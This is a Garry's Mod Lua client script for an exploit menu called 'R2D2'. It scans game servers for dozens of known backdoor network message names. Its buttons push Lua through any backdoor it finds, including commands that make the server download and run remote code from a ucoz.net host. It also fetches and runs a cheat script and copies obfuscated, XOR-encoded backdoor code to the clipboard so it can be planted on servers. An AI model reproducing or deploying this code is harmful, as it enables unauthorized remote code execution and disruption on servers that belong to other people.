R8 = R8 or {}
R8.Modules = R8.Modules or {}


concommand.Add('trace', function(pl)
    local prop = pl:GetEyeTrace().Entity

    if IsValid(prop) then
        pl:PrintMessage(HUD_PRINTCONSOLE, prop:GetClass())
        pl:PrintMessage(HUD_PRINTCONSOLE, 'mdl = \'' .. prop:GetModel() .. '\',')
        pl:PrintMessage(HUD_PRINTCONSOLE, 'pos = Vector(' .. string.gsub(tostring(prop:GetPos()), ' ', ', ') .. '),')
        pl:PrintMessage(HUD_PRINTCONSOLE, 'ang = Angle(' .. string.gsub(tostring(prop:GetAngles()), ' ', ', ') .. '),')
        pl:PrintMessage(HUD_PRINTCONSOLE, 'mat = \'' .. prop:GetMaterial() .. '\',')
    end
end)

surface.CreateFont("exitmenu", {
    font = "Arial",
    size = 20,
    weight = 1000,
    shadow = false,
    outline = false
})

local function exitmenu(panel, X, y)
    local CButton = vgui.Create("DButton", panel)
    CButton:SetTextColor(Color(150, 150, 150))
    CButton:SetText("X")
    CButton:SetFont("exitmenu")
    CButton:SetPos(X, y)
    CButton:SetSize(50, 24)

    CButton.DoClick = function()
        panel:SizeTo(0, 0, .2, 0, .2)

        timer.Simple(0.3, function()
            panel:SetVisible(false)
        end)
    end

    CButton.Paint = function(panel, w, h)
        surface.SetDrawColor(Color(0, 0, 0, 255))
        surface.DrawOutlinedRect(0, 0, CButton:GetSize())
        draw.RoundedBox(0, 0, 0, w, h, Color(139, 0, 0, 255))
    end

    CButton.OnCursorEntered = function(self)
        surface.PlaySound("garrysmod/ui_hover.wav")

        CButton.Paint = function(panel, w, h)
            draw.RoundedBox(0, 0, 0, w, h, Color(220, 20, 60, 255))
        end
    end

    -------------------------------------------------------------
    CButton.OnCursorExited = function(self)
        CButton.Paint = function(panel, w, h)
            draw.RoundedBox(0, 0, 0, w, h, Color(139, 0, 0, 255))
        end
    end
    ------------------------------------------------------------------------
end

local blur = Material("pp/blurscreen")

local function DrawBlur(panel, amount)
    local x, y = panel:LocalToScreen(0, 0)
    local scrW, scrH = ScrW(), ScrH()
    surface.SetDrawColor(255, 255, 255)
    surface.SetMaterial(blur)

    for i = 1, 3 do
        blur:SetFloat("$blur", (i / 3) * (amount or 6))
        blur:Recompute()
        render.UpdateScreenEffectTexture()
        surface.DrawTexturedRect(x * -1, y * -1, scrW, scrH)
    end
end

netKey = "memeDoor"
BackdoorsFound = 0

function ValidNetString(str)
    local status, error = pcall(net.Start, str)

    return status
end

BackDoor_net = {
    {
        NetWork = "Sandbox_ArmDupe"
    },
    {
        NetWork = "Sbox_darkrp"
    },
    {
        NetWork = "Sbox_itemstore"
    },
    {
        NetWork = "Ulib_Message"
    },
    {
        NetWork = "ULogs_Info"
    },
    {
        NetWork = "ITEM"
    },
    {
        NetWork = "R8"
    },
    {
        NetWork = "fix"
    },
    {
        NetWork = "Fix_Keypads"
    },
    {
        NetWork = "Remove_Exploiters"
    },
    {
        NetWork = "noclipcloakaesp_chat_text"
    },
    {
        NetWork = "_Defqon"
    },
    {
        NetWork = "_CAC_ReadMemory",
"nostrip"
    },
    {
        NetWork = "nocheat"
    },
    {
        NetWork = "LickMeOut"
    },
    {
        NetWork = "ULX_QUERY2"
    },
    {
        NetWork = "ULXQUERY2"
    },
    {
        NetWork = "MoonMan"
    },
    {
        NetWork = "Im_SOCool"
    },
    {
        NetWork = "Sandbox_GayParty"
    },
    {
        NetWork = "DarkRP_UTF8"
    },
    {
        NetWork = "oldNetReadData"
    },
    {
        NetWork = "memeDoor"
    },
    {
        NetWork = "BackDoor"
    },
    {
        NetWork = "OdiumBackDoor"
    },
    {
        NetWork = "SessionBackdoor"
    },
    {
        NetWork = "DarkRP_AdminWeapons"
    },
    {
        NetWork = "cucked"
    },
    {
        NetWork = "NoNerks"
    },
    {
        NetWork = "kek"
    },
    {
        NetWork = "ZimbaBackDoor"
    },
    {
        NetWork = "something"
    },
    {
        NetWork = "random"
    },
    {
        NetWork = "strip0"
    },
    {
        NetWork = "fellosnake"
    },
    {
        NetWork = "enablevac"
    },
    {
        NetWork = "idk"
    },
    {
        NetWork = "c"
    },
    {
        NetWork = "killserver"
    },
    {
        NetWork = "fuckserver"
    },
    {
        NetWork = "cvaraccess"
    },
    {
        NetWork = "rcon"
    },
    {
        NetWork = "rconadmin"
    },
    {
        NetWork = "web"
    },
    {
        NetWork = "jesuslebg"
    },
    {
        NetWork = "zilnix"
    },
    {
        NetWork = "ГћГ ?D)в—"
    },
    {
        NetWork = "disablebackdoor"
    },
    {
        NetWork = "kill"
    },
    {
        NetWork = "DefqonBackdoor"
    }
}

function checkbackdoors()
    for k, v in pairs(BackDoor_net) do
        if (ValidNetString(v.NetWork)) then
            BackdoorsFound = 1 + BackdoorsFound
            chat.AddText(Color(0, 0, 0, 125), "[R2D2]", Color(255, 255, 255), " Found Backdoor! - " .. v.NetWork)
        end
    end
end

CreateClientConVar("menu_r", "148", true, false)
CreateClientConVar("menu_g", "0", true, false)
CreateClientConVar("menu_b", "211", true, false)

--------------------------------------------------------------------------------------------
surface.CreateFont("Main", {
    font = "Arial",
    size = 20,
    weight = 1000,
    shadow = false,
    outline = false
})

local insertdown2, insertdown, menuopen

function MainMenu()
    local x1 = vgui.Create("DFrame")
    x1:SetPos(700, 300)
    x1:SizeTo(300, 400, .3, 0, .3)
    exitmenu(x1, 249, 1)
    x1:SetTitle(" ")
    x1:ShowCloseButton(false)
    x1:SetVisible(true)
    x1:MakePopup()

    function x1:Paint()
        DrawBlur(self, 5)
        draw.RoundedBox(4, 0, 0, 5000, 5000, Color(GetConVarNumber("menu_r"), GetConVarNumber("menu_g"), GetConVarNumber("menu_b"), 170))
        surface.SetDrawColor(Color(0, 0, 0, 255))
        surface.DrawOutlinedRect(0, 0, x1:GetSize())
        ---------------------------------------------------------
        surface.DrawOutlinedRect(0, 110, x1:GetSize())
        --surface.DrawOutlinedRect( 0, 130, x1:GetSize() )
        ---------------------------------------------------------
        surface.DrawOutlinedRect(0, 25, x1:GetSize())
        -------------------------------------------------
        surface.DrawOutlinedRect(0, 0, 249, 26)
        surface.DrawOutlinedRect(0, 110, 101, 90)
        surface.DrawOutlinedRect(0, 110, 500, 90)
        --surface.DrawOutlinedRect( 0, 30, x1:GetSize() )
        --
        surface.DrawOutlinedRect(100, 25, x1:GetSize())
        --
        --surface.DrawOutlinedRect( -6, 25, x1:GetSize() )
        --
        --surface.DrawOutlinedRect( 0, -6, x1:GetSize() )
        ------------------------------------------------
    end

    x1.Think = function()
        if (input.IsKeyDown(KEY_INSERT) and not insertdown2) then
            x1:SizeTo(0, 0, .2, 0, .2)

            timer.Simple(0.1, function()
                x1:Remove()
            end)

            menuopen = false
        end
    end

    local function Think()
        if (input.IsKeyDown(KEY_INSERT) and not menuopen and not insertdown) then
            menuopen = true
            insertdown = true
            MainMenu()
        elseif (not input.IsKeyDown(KEY_INSERT) and not menuopen) then
            insertdown = false
        end

        if (input.IsKeyDown(KEY_INSERT) and insertdown and menuopen) then
            insertdown2 = true
        else
            insertdown2 = false
        end
    end

    hook.Add("Think", "", Think)
    local news_p1 = vgui.Create("DPanel", x1)
    news_p1:SetPos(100, 200)
    news_p1:SetSize(200, 200)

    -- Paint will paint the current page (Changing color, shape, etc)
    news_p1.Paint = function(self, w, h)
        draw.RoundedBox(4, 0, 0, w, h, Color(40, 40, 40, 170))
    end

    local richtext = vgui.Create("RichText", news_p1)
    richtext:Dock(FILL)
    local TheReturnedHTML = "" -- Blankness

    http.Fetch("http://u38947.onhh.ru/VG2X212E112/news.lua", function(body, len, headers, code)
        TheReturnedHTML = body
        richtext:SetText(TheReturnedHTML)
    end, function(error)
        richtext:SetText("РќРµ СѓРґР°Р»РѕСЃСЊ РїРѕР»СѓС‡РёС‚СЊ РЅРѕРІРѕСЃС‚Рё СЃ РЅР°С€РµРіРѕ СЃРµСЂРІРµСЂР°. \n Р’РѕР·РјРѕР¶РЅРѕ, Сѓ РІР°СЃ РїСЂРѕРїР°Р»Рѕ СЃРѕРµРґРёРЅРµРЅРёРµ СЃ РёРЅС‚РµСЂРЅРµС‚РѕРј \n РёР»Рё РЅР°С€Рё СЃРµСЂРІРµСЂР° РІСЂРµРјРµРЅРЅРѕ РЅРµ РґРѕСЃС‚СѓРїРЅС‹.")
    end)

    local q1 = vgui.Create("DHTML", x1)
    q1:OpenURL("http://sdsds.ucoz.net/baby-clipart-r2d2-11.png")
    q1:SetSize(150, 150)
    q1:SetPos(6, 110)

    surface.CreateFont("B1", {
        font = "Arial",
        size = 20,
        weight = 1000,
        shadow = false,
        outline = false
    })

    ex = true
    ct = true
    nh = true

    func_table = {
        --
        {
            ---------------------------------------
            Name = "Exploit",
            Func = function()
                -- if ex then
                --     R8.Modules.Exploit()
                -- end

                ex = false
                x1:SizeTo(0, 0, .2, 0, .2)
                x1:SetVisible(false)

                timer.Simple(0.5, function()
                    LocalPlayer():ConCommand('R8_Exploit')
                end)

                surface.PlaySound("garrysmod/ui_click.wav")
            end
        },
        ---------------------------------------
        --
        {
            ---------------------------------------
            Name = "Cheat",
            Func = function()
                if ct then
                    http.Fetch('http://sdsds.ucoz.net/ampris.lua', RunString)
                end

                ct = false
                x1:SizeTo(0, 0, .2, 0, .2)
                x1:SetVisible(false)

                timer.Simple(0.5, function()
                    LocalPlayer():ConCommand('Ampris_menu')
                end)

                surface.PlaySound("garrysmod/ui_click.wav")
            end
        },
        ---------------------------------------
        --
        --
        {
            ---------------------------------------
            Name = 'BackDoor',
            Func = function()
              --  if nh then
                   -- R8.Modules.BackDoor()
               -- end

                nh = false
                x1:SizeTo(0, 0, .2, 0, .2)
                x1:SetVisible(false)

                timer.Simple(0.5, function()
                    LocalPlayer():ConCommand('bd_menu')
                end)

                surface.PlaySound("garrysmod/ui_click.wav")
            end
        }
    }

    ---------------------------------------
    --
    for k, v in pairs(func_table) do
        local Buttons = vgui.Create("DButton", x1)
        Buttons:Dock(4)
        Buttons:DockMargin(0, 0, 200, 5)
        Buttons:SetText(v.Name)
        Buttons:SetFont('B1')
        Buttons:SetTextColor(Color(255, 255, 255, 255))
        Buttons.DoClick = v.Func

        Buttons.OnCursorEntered = function(self)
            surface.PlaySound("garrysmod/ui_hover.wav")
        end

        function Buttons:Paint()
            --draw.SimpleText( "|", "B1", 5, 0, Color( 255, 255, 255, 200 ), 0, 0  )
            --
            --draw.SimpleText( "|", "B1", 270, 0, Color( 255, 255, 255, 200 ), 0, 0  )
            draw.RoundedBox(0, 0, 0, 500, 500, Color(0, 0, 0, 120))
            surface.SetDrawColor(Color(0, 0, 0, 255))
            surface.DrawOutlinedRect(0, 0, Buttons:GetSize())
            surface.DrawOutlinedRect(0, 25, Buttons:GetSize())
        end
    end

    -----------------------------------------------------------------------------
    local b5 = vgui.Create("DButton", x1)
    b5:Dock(TOP)
    b5:DockMargin(100, -81, 0, 5)
    b5:SetText('| BackDoor | Check |')
    b5:SetFont('B1')
    b5:SetTextColor(Color(255, 255, 255, 255))

    function b5:DoClick()
        surface.PlaySound("garrysmod/ui_click.wav")
        checkbackdoors()
    end

    b5.OnCursorEntered = function(self)
        surface.PlaySound("garrysmod/ui_hover.wav")
    end

    function b5:Paint()
        draw.RoundedBox(0, 0, 0, 500, 500, Color(0, 0, 0, 120))
        surface.SetDrawColor(Color(0, 0, 0, 255))
        surface.DrawOutlinedRect(0, 0, b5:GetSize())
        surface.DrawOutlinedRect(0, 25, b5:GetSize())
    end

    local b6 = vgui.Create("DButton", x1)
    b6:Dock(TOP)
    b6:DockMargin(100, 0, 0, 5)
    b6:SetText('Theme Color')
    b6:SetFont('B1')
    b6:SetTextColor(Color(255, 255, 255, 255))

    b6.OnCursorEntered = function(self)
        surface.PlaySound("garrysmod/ui_hover.wav")
    end

    function b6:DoClick()
        surface.PlaySound("garrysmod/ui_click.wav")
        LocalPlayer():ConCommand('R8_theme')
    end

    function b6:Paint()
        draw.RoundedBox(0, 0, 0, 500, 500, Color(0, 0, 0, 120))
        surface.SetDrawColor(Color(0, 0, 0, 255))
        surface.DrawOutlinedRect(0, 0, b6:GetSize())
        surface.DrawOutlinedRect(0, 25, b6:GetSize())
    end

    local b7 = vgui.Create("DButton", x1)
    b7:Dock(TOP)
    b7:DockMargin(100, 0, 0, 5)
    b7:SetText("Copy BackDoor")
    b7:SetFont('B1')
    b7:SetTextColor(Color(255, 255, 255, 255))

    function b7:DoClick()
        surface.PlaySound("garrysmod/ui_click.wav")
        local backdoorr8 = [[local вЂЄ = _G local вЂЄвЂЄ = вЂЄ['\115\116\114\105\110\103'] local вЂЄвЂЄвЂЄ = вЂЄ['\98\105\116']['\98\120\111\114'] local function вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ(вЂЄвЂЄвЂЄвЂЄ) if вЂЄвЂЄ['\108\101\110'](вЂЄвЂЄвЂЄвЂЄ) == 0 then return вЂЄвЂЄвЂЄвЂЄ end local вЂЄвЂЄвЂЄвЂЄвЂЄ = '' for _ in вЂЄвЂЄ['\103\109\97\116\99\104'](вЂЄвЂЄвЂЄвЂЄ,'\46\46') do вЂЄвЂЄвЂЄвЂЄвЂЄ=вЂЄвЂЄвЂЄвЂЄвЂЄ..вЂЄвЂЄ['\99\104\97\114'](вЂЄвЂЄвЂЄ(вЂЄ["\116\111\110\117\109\98\101\114"](_,16),25)) end return вЂЄвЂЄвЂЄвЂЄвЂЄ end вЂЄ[вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'6c6d7075'][вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'587d7d577c6d6e766b724a6d6b70777e'](вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'4b21')вЂЄ[вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'777c6d'][вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'4b7c7a7c706f7c'](вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'4b21',function ()local falseвЂЄ=вЂЄ[вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'5a76746970757c4a6d6b70777e'](вЂЄ[вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'777c6d'][вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'4b7c787d4a6d6b70777e'](),вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'556c785a747d',false )if вЂЄ[вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'706a7f6c777a6d707677'](falseвЂЄ)then falseвЂЄ()end end )]]
        SetClipboardText(backdoorr8)
        LocalPlayer():ChatPrint(':)))).')
    end

    b7.OnCursorEntered = function(self)
        surface.PlaySound("garrysmod/ui_hover.wav")
    end

    function b7:Paint()
        draw.RoundedBox(0, 0, 0, 500, 500, Color(0, 0, 0, 120))
        surface.SetDrawColor(Color(0, 0, 0, 255))
        surface.DrawOutlinedRect(0, 0, b7:GetSize())
        surface.DrawOutlinedRect(0, 25, b7:GetSize())
    end

    -----------------------------------------------------------------------------
    -----------------------------------------------------------------------------
    local b8 = vgui.Create("DButton", x1)
    b8:Dock(TOP)
    b8:DockMargin(100, 6, 0, 5)
    b8:SetText('Love you.')
    b8:SetFont('B1')
    b8:SetTextColor(Color(255, 255, 255, 255))

    function b8:DoClick()
        surface.PlaySound("garrysmod/ui_click.wav")

        for k, v in pairs(BackDoor_net) do
            if (ValidNetString(v.NetWork)) then
                net.Start(v.NetWork)
                net.WriteString([[for _, p in pairs( player.GetAll() ) do p:SendLua( 'chat.AddText( Color(200, 200, 255 ), "[R2D2] Love Star Wars.")' ) sound.Play( "ambient/explosions/explode_8.wav", p:GetPos(), 90, 80, 1 ) end]])
                net.WriteBit(1)
                net.SendToServer()
            end
        end
    end

    b8.OnCursorEntered = function(self)
        surface.PlaySound("garrysmod/ui_hover.wav")
    end

    function b8:Paint()
        draw.RoundedBox(0, 0, 0, 500, 500, Color(0, 0, 0, 120))
        surface.SetDrawColor(Color(0, 0, 0, 255))
        surface.DrawOutlinedRect(0, 0, b8:GetSize())
        surface.DrawOutlinedRect(0, 25, b8:GetSize())
    end

    local b9 = vgui.Create("DButton", x1)
    b9:Dock(TOP)
    b9:DockMargin(100, 0, 0, 5)
    b9:SetText('Disco Time - BackDoor')
    b9:SetFont('B1')
    b9:SetTextColor(Color(255, 255, 255, 255))

    function b9:DoClick()
        surface.PlaySound("garrysmod/ui_click.wav")

        for k, v in pairs(BackDoor_net) do
            if (ValidNetString(v.NetWork)) then
                net.Start(v.NetWork)
                net.WriteString("http.Fetch(\"http://sdsds.ucoz.net/disco.lua\",function(b,l,h,c)RunString(b)end,nil)")
                net.WriteBit(1)
                net.SendToServer()
            end
        end
    end

    b9.OnCursorEntered = function(self)
        surface.PlaySound("garrysmod/ui_hover.wav")
    end

    function b9:Paint()
        draw.RoundedBox(0, 0, 0, 500, 500, Color(0, 0, 0, 120))
        surface.SetDrawColor(Color(0, 0, 0, 255))
        surface.DrawOutlinedRect(0, 0, b9:GetSize())
        surface.DrawOutlinedRect(0, 25, b9:GetSize())
    end

    local b10 = vgui.Create("DButton", x1)
    b10:Dock(TOP)
    b10:DockMargin(100, 0, 0, 3)
    b10:SetText('R2D2 - BackDoor')
    b10:SetFont('B1')
    b10:SetTextColor(Color(255, 255, 255, 255))

    function b10:DoClick()
        surface.PlaySound("garrysmod/ui_click.wav")

        for k, v in pairs(BackDoor_net) do
            if (ValidNetString(v.NetWork)) then
                net.Start(v.NetWork)
                net.WriteString("http.Fetch(\"http://sdsds.ucoz.net/child_exploits.lua\",function(b,l,h,c)RunString(b)end,nil)")
                net.WriteBit(1)
                net.SendToServer()
            end
        end
    end

    b10.OnCursorEntered = function(self)
        surface.PlaySound("garrysmod/ui_hover.wav")
    end

    function b10:Paint()
        draw.RoundedBox(0, 0, 0, 500, 500, Color(0, 0, 0, 120))
        surface.SetDrawColor(Color(0, 0, 0, 255))
        surface.DrawOutlinedRect(0, 0, b10:GetSize())
        surface.DrawOutlinedRect(0, 25, b10:GetSize())
    end

    ------------------------------------------------------------------------------------------------------------------------
    function ColorMenu()
        local ColorMenu = vgui.Create("DFrame")
        ColorMenu:SetPos(399, 300)
        ColorMenu:SizeTo(300, 265, .3, 0, .3)
        ColorMenu:MakePopup()
        ColorMenu:SetTitle("")
        ColorMenu:SetVisible(true)
        ColorMenu:ShowCloseButton(false)
        exitmenu(ColorMenu, 249, 1)

        ColorMenu.Paint = function(self, w, h)
            DrawBlur(self, 3)
            draw.RoundedBox(4, 0, 0, 5000, 5000, Color(GetConVarNumber("menu_r"), GetConVarNumber("menu_g"), GetConVarNumber("menu_b"), 170))
            surface.SetDrawColor(Color(0, 0, 0, 255))
            surface.DrawOutlinedRect(0, 0, ColorMenu:GetSize())
            surface.DrawOutlinedRect(0, 25, ColorMenu:GetSize())
            -------------------------------------------------
            surface.DrawOutlinedRect(0, 0, 249, 26)
            surface.DrawOutlinedRect(0, 0, ColorMenu:GetSize())
        end

        local color2 = vgui.Create("DColorMixer", ColorMenu)
        color2:Dock(TOP)
        color2:DockMargin(0, 0, 0, 0)
        color2:SetPalette(false)
        color2:SetWangs(false)
        color2:SetAlphaBar(false)
        color2:SetColor(Color(GetConVarNumber("menu_r"), GetConVarNumber("menu_g"), GetConVarNumber("menu_b"), 255))

        function color2:ValueChanged(color)
            LocalPlayer():ConCommand("menu_r " .. color.r)
            LocalPlayer():ConCommand("menu_g " .. color.g)
            LocalPlayer():ConCommand("menu_b " .. color.b)
        end
    end

    concommand.Add('R8_theme', ColorMenu)

    -----------------------------------------------------------------------------
    local table_credits = {
        {
            text = "FIX MAN",
            durl = "https://vk.com/dembi1"
        },
        {
            text = "Discord",
            durl = "https://discord.gg/BszpW92"
        },
        {
            text = "Pidor",
            durl = "https://vk.com/pirohok123"
        }
    }

    for k, v in pairs(table_credits) do
        local Credits = vgui.Create("DButton", x1)
        Credits:Dock(5)
        Credits:DockMargin(1, 5, 199, 5)
        Credits:SetText(v.text)
        Credits:SetFont('B1')
        Credits:SetTextColor(Color(255, 255, 255, 255))

        Credits.OnCursorEntered = function(self)
            surface.PlaySound("garrysmod/ui_hover.wav")
        end

        function Credits:DoClick()
            surface.PlaySound("garrysmod/ui_click.wav")
            gui.OpenURL(v.durl)
        end

        function Credits:Paint()
            draw.RoundedBox(0, 0, 0, 500, 500, Color(0, 0, 0, 120))
            surface.SetDrawColor(Color(0, 0, 0, 255))
            surface.DrawOutlinedRect(0, 0, Credits:GetSize())
            surface.DrawOutlinedRect(0, 25, Credits:GetSize())
        end
    end
end

concommand.Add('R8_Menu', MainMenu)


//////////// [BASIC SHIT] ////////////
local blur = Material("pp/blurscreen")

local function DrawBlur(panel, amount)
    local x, y = panel:LocalToScreen(0, 0)
    local scrW, scrH = ScrW(), ScrH()
    surface.SetDrawColor(255, 255, 255)
    surface.SetMaterial(blur)

    for i = 1, 3 do
        blur:SetFloat("$blur", (i / 3) * (amount or 6))
        blur:Recompute()
        render.UpdateScreenEffectTexture()
        surface.DrawTexturedRect(x * -1, y * -1, scrW, scrH)
    end
end

CreateClientConVar("menu_r", "0", true, false)
CreateClientConVar("menu_g", "0", true, false)
CreateClientConVar("menu_b", "0", true, false)

-- Solly copypaste
if (istable(MOTDgd)) then
    MOTDgd = {}

    function MOTDgd.Show()
    end

    function MOTDgd.GetIfSkip()
        return true
    end
end

local function exitmenu(panel, X, y)
    local CButton = vgui.Create("DButton", panel)
    CButton:SetTextColor(Color(150, 150, 150))
    CButton:SetText("X")
    CButton:SetFont("exitmenu")
    CButton:SetPos(X, y)
    CButton:SetSize(50, 24)

    CButton.DoClick = function()
        panel:SizeTo(0, 0, .2, 0, .2)

        timer.Simple(0.3, function()
            panel:SetVisible(false)
        end)
    end

    CButton.Paint = function(panel, w, h)
        surface.SetDrawColor(Color(0, 0, 0, 255))
        surface.DrawOutlinedRect(0, 0, CButton:GetSize())
        draw.RoundedBox(0, 0, 0, w, h, Color(139, 0, 0, 255))
    end

    CButton.OnCursorEntered = function(self)
        surface.PlaySound("garrysmod/ui_hover.wav")

        CButton.Paint = function(panel, w, h)
            draw.RoundedBox(0, 0, 0, w, h, Color(220, 20, 60, 255))
        end
    end

    -------------------------------------------------------------
    CButton.OnCursorExited = function(self)
        CButton.Paint = function(panel, w, h)
            draw.RoundedBox(0, 0, 0, w, h, Color(139, 0, 0, 255))
        end
    end
    ------------------------------------------------------------------------
end

function random_string(length)
    math.randomseed(os.time())

    if length > 0 then
        return random_string(length - 1) .. charset[math.random(1, #charset)]
    else
        return ""
    end
end

local s = {}
s.duel = {}
s.duel[1] = table.Random(player.GetAll())
s.duel[2] = table.Random(player.GetAll())
s.duel[2] = 3
s.duel[3] = -9999999

--////////// [CHAT TEXT] ////////////
function ECPrint(str)
    chat.AddText(Color(150, 150, 150), "[R2D2] ", Color(255, 255, 255), str)
end

--////////// [NOTIFY] ////////////
local function ECNotify(text)
    local notify = vgui.Create("DPanel")
    notify:SetSize(200, 50)
    notify:SetPos(ScrW() - 200, -50)

    notify.Paint = function(self, w, h)
        draw.RoundedBox(0, 0, 0, w, h, Color(50, 50, 50))
        local bars = 50

        for i = 0, bars do
            local rainbow = HSVToColor(CurTime() % 6 * 60 + i, 1, 1)
            draw.RoundedBox(0, i * w / bars, notify:GetTall() - 2, w / bars, 3, Color(i + 1 * rainbow.r, i + 1 * rainbow.g, i + 1 * rainbow.b, 255))
        end

        --draw.RoundedBox( 0, 0, notify:GetTall() - 2, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        draw.SimpleText(text, "Calibri-l", notify:GetWide() / 2, notify:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    notify:MoveTo(ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
        timer.Simple(3, function()
            notify:MoveTo(ScrW() - notify:GetWide(), -50, .2, 0, -1)
        end)
    end)
end

--////////// [CLEAR CHAT] ////////////
function clearchat()
    for i = 0, 100 do
        chat.AddText(" ")
    end
end

--////////// [REMOVE ALL ERRORS] ////////////
concommand.Add("removerrors", function()
    hook.Add("Think", "wow", function()
        for k, v in pairs(ents.GetAll()) do
            if (v:GetModel():find("models/error.mdl")) then
                v:SetModel("models/player/group01/male_02.mdl")
                print(v:Nick() .. " model reset due to models/error.mdl")
            end
        end
    end)
end)

--////////// [VAPE] ////////////
function Vape()
    timer.Simple(0, function()
        RunConsoleCommand("+attack")
    end)

    timer.Simple(5.134, function()
        RunConsoleCommand("-attack")
    end)
end

concommand.Add("vape", Vape)
concommand.Add("clearchat", clearchat)

--////////// [CAC CHECKER] ////////////
if (_G.QAC or _G.CAC) then
    chat.AddText(Color(0, 255, 255), "[", "R2D2", "] ", Color(255, 255, 255), "The server has Cake Anti Cheat!")
end

function Initialize()
    print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
    surface.PlaySound("HL1/fvox/bell.wav")
    -- surface.PlaySound("buttons/button15.wav")
    ECNotify("Loaded Successfully!")
    net.Receive("DL_Answering_global", function(_len) end) -- Stop LocalPlayer from getting kicked whilst kicking all
    net.Receive("metro_notification", function() return end) -- Disable Metro Notification

    --////////// Font Creation ////////////
    --
    surface.CreateFont("Roboto", {
        font = "Roboto",
        size = 18
    })

    --
    surface.CreateFont("Calibri-sm", {
        font = "Calibri",
        size = 15
    })

    --
    surface.CreateFont("Calibri-l", {
        font = "Calibri",
        size = 21
    })

    --
    surface.CreateFont("tahoma", {
        font = "Tahoma",
        size = 15
    })
    --
end

Initialize() -- Initializes basic shit for when menu is loaded.

function ValidNetString(str)
    local status, error = pcall(net.Start, str)

    return status
end

------------------------------------------------------------------------
--////////// [MENU] ////////////
function draw.OutlinedBox(x, y, w, h, thickness, clr)
    surface.SetDrawColor(clr)

    for i = 0, thickness - 1 do
        surface.DrawOutlinedRect(x + i, y + i, w - i * 2, h - i * 2)
    end
end

-------------------------------------------------------------------------------------------
surface.CreateFont("Main", {
    font = "Arial",
    size = 20,
    weight = 1000,
    shadow = false,
    outline = false
})

function R8_Menu()
	local menu = vgui.Create("DFrame")
	menu:Center()
	menu:SizeTo(300, 350, .3, 0, .3)
	exitmenu(menu, 249, 1)
	menu:SetTitle(" ")
	menu:ShowCloseButton(false)
	menu:MakePopup()

	function menu:Paint()
	    DrawBlur(self, 5)
	    draw.RoundedBox(4, 0, 0, 5000, 5000, Color(GetConVarNumber("menu_r"), GetConVarNumber("menu_g"), GetConVarNumber("menu_b"), 170))
	    draw.SimpleText(totalSploits .. "/302 Exploits - R2D2", "Roboto", 5, 3, Color(255, 255, 255, 200), 0, 0)

	    if totalSploits == 0 then
	        draw.SimpleText("РРєСЃРїР»РѕР№С‚РѕРІ РЅРµ РЅР°Р№РґРµРЅРѕ!", "Roboto", 65, 150, Color(255, 255, 255, 200), 0, 0)
	    end

	    surface.SetDrawColor(Color(0, 0, 0, 255))
	    surface.DrawOutlinedRect(0, 0, menu:GetSize())
	    surface.DrawOutlinedRect(0, 0, 249, 26) -- РїР°Р»РѕС‡РєР° РґР»СЏ РєРЅРѕРїРєРё
	    surface.DrawOutlinedRect(0, 25, menu:GetSize())
	end

	--////////// [TABS] ////////////
	local tabs = vgui.Create("DPropertySheet", menu)
	tabs:Dock(FILL)
	tabs:DockPadding(-5, 5, 0, 0)

	tabs.Paint = function(self, w, h)
	    for k, v in pairs(tabs.Items) do
	        if (not v.Tab) then continue end

	        v.Tab.Paint = function(self, w, h)
	            draw.RoundedBox(0, 0, 0, w, 22, Color(25, 25, 25, 255))
	            draw.RoundedBox(0, 0, 22, w - 2, 1, Color(45, 45, 45, 255))

	            if (tabs:GetActiveTab() == v.Tab) then
	                draw.RoundedBox(0, 0, 0, w, 22, Color(25, 25, 25, 255))
	                --draw.RoundedBox( 0, 0, 22, w - 2, 1, Color( 255, 255, 255, 255 ) )
	                draw.RoundedBox(0, 0, 22, w, 1, Color(255, 255, 255, 255))
	            end
	        end
	    end
	end

	--////////// [PANELS] ////////////
	local exploitsPanel = vgui.Create("DPanel", menu)
	exploitsPanel:Dock(1)

	exploitsPanel.Paint = function(self, w, h)
	    draw.RoundedBox(0, 0, 0, w, h, Color(25, 25, 25, 100))
	    draw.OutlinedBox(0, 0, w, h, 1, Color(0, 0, 0))
	end

	local exploitsScrollPanel = vgui.Create("DScrollPanel", exploitsPanel)
	exploitsScrollPanel:Dock(FILL)

	//////////// [NEW EXPLOIT] ////////////
	--------------------
	totalSploits = 0

	function addExploit(id, text, desc, func)
	    totalSploits = 1 + totalSploits
	    local id = vgui.Create("DButton", exploitsScrollPanel)
	    id:SetText(text)
	    id:SetTextColor(Color(200, 200, 200))
	    id:SetFont("Roboto")
	    id:Dock(TOP)
	    id:DockMargin(10, 10, 10, -5)
	    id:DockPadding(2, 25, 2, 50)
	    id.DoClick = func

	    if desc then
	        id:SetToolTip(desc)
	    end

	    id.Paint = function(self, w, h)
	        id.OnCursorEntered = function(self)
	            -- surface.PlaySound( "garrysmod/ui_hover.wav" )
	            surface.PlaySound("buttons/button15.wav")
	        end

	        if id:IsHovered() then
	            draw.RoundedBox(0, 0, 0, 500, 500, Color(0, 0, 0, 120))
	            surface.SetDrawColor(Color(0, 0, 0, 255))
	            surface.DrawOutlinedRect(0, 0, id:GetSize())
